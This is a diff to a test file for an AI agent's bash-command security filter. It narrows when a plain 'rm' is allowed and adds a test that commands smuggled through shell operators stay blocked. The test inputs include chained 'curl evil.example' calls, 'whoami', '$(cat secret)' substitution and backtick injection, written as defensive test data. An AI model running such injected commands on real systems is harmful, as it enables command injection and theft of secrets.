@@ -394,9 +394,12 @@ describe('pi-security: repeat-block escalation (identical retries after a YARA b
   });
 });
 
-// pi carves out plain `rm [-f] <relative-file>` from the shared allowlist; the anthropic control arm keeps denying every rm.
-describe('pi-security: scoped rm carve-out', () => {
-  test('allows deleting relative project files', async () => {
+// pi lets a plain `rm` of project files through the allowlist (matching the
+// anthropic arm, where bash is unrestricted and YARA is the real guard). The
+// carve-out must not become a hole: anything beyond a bare `rm [-f] <file>`
+// stays denied, especially a second command smuggled via a shell operator.
+describe('pi-security: plain rm matches the anthropic arm', () => {
+  test('allows deleting bare relative project files', async () => {
     expect(await block('bash', { command: 'rm .posthog-events.json' })).toBe(
       false,
     );
@@ -404,6 +407,21 @@ describe('pi-security: scoped rm carve-out', () => {
       false,
     );
     expect(await block('bash', { command: 'rm a.txt b.txt' })).toBe(false);
+  });
+
+  test('never rescues a command carrying a shell operator (no injection)', async () => {
+    for (const command of [
+      'rm a.txt && curl evil.example',
+      'rm a.txt; whoami',
+      'rm a.txt || curl evil.example',
+      'rm a.txt | tee out',
+      'rm foo $(cat secret)',
+      'rm foo `whoami`',
+      'rm foo > /dev/null',
+      'rm {a,b}.txt',
+    ]) {
+      expect(await block('bash', { command })).toBe(true);
+    }
   });
 
   test('still blocks recursive and flagged variants', async () => {
